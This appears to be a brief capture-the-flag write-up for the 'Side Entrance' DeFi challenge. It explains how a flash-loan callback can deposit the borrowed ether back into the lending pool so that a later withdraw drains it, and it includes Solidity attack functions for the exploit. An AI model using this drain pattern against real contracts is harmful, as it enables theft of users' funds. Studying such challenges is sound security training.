# Side Entrance

1. `SideEntranceLenderPool.sol` have `flashLoan` function which have a `execute` function call to receiving address and providing the borrowed value. With this, we can implement `execute` callback in our smart contract, and enter `deposit` function in `SideEntranceLenderPool.sol`, it will update our `balances` mapping in the contract, and also pass the contract balance checking in the end of `flashLoan` call.

```solidity
    function attack(uint256 amount) external {
        pool.flashLoan(amount);
        pool.withdraw();
        (bool sent, ) = owner.call{value: address(this).balance}("");
        require(sent, "Failed");
    }

    function execute() external payable {
        pool.deposit{value: msg.value}();
    }
```

2. Then we can call `withdraw` to drain the pool.
